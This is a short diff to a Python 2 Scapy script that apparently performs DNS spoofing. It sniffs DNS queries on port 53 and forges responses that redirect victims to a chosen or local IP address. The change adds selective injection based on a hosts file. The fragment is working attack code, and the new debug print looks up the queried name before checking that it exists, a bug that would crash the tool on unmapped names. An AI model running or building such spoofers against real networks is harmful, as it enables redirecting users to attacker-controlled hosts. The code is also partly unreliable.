@@ -24,7 +24,6 @@ def get_args():
 				if len(line) != 2:
 					continue;
 				hosts[line[1].strip()] = line[0].strip();
-		print "Hosts", hosts;
 
 	if (arg.expression):
 		#print "Expression",
@@ -34,11 +33,14 @@ def get_args():
 def dns_packet(packet):
 	global hosts, my_ip, soc
 	if ((UDP in packet) and (packet.dport == 53) and (DNSRR not in packet)):
-		
+		print "Query", hosts[packet[DNSQR].qname[:-1]]
 		if (packet[DNSQR].qname[:-1] in hosts):
 			spoofed_ip = hosts[packet[DNSQR].qname[:-1]];
-		else :
+		elif (len(hosts) == 0):
 			spoofed_ip = my_ip;
+		else:
+			print "Will Not Inject"
+			return
 		
 		print "Spoofed IP is", spoofed_ip;
 		spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst)/\
